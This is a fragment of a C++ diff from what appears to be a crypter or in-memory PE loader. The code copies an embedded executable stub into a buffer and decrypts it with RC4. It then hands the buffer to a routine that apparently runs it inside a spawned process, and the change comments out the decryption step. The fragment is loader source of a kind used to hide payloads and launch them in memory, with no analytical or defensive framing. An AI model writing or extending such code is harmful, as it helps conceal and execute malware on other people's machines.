@@ -95,7 +95,9 @@ int main()
 		_dat[i] = _dummy_pe[i];
 	}
 	//3rd paramer is the size of the array in bytes, 4th parameter is the size of the key in bytes
-	_rc4::_run_direct(lvoid(key), _dat, 184320, 9);
+	// 
+	// ONLY USE THE BELOW RC4 METHOD IF YOU HAVE ENCRYPTED YOUR PE STUB WITH A VALID RC4 IMPLEMENTATION
+	//_rc4::_run_direct(lvoid(key), _dat, 184320, 9);
 	if (!_funcs::_shellcode_gen_pe_loc(&_pi, &_si, reinterpret_cast<LPVOID>(_dat), _argsz, sizeof _argsz)) {
 		_api::__WaitForSingleObject(_pi.hProcess, INFINITE);
 		_api::__GetExitCodeProcess(_pi.hProcess, &_ret);
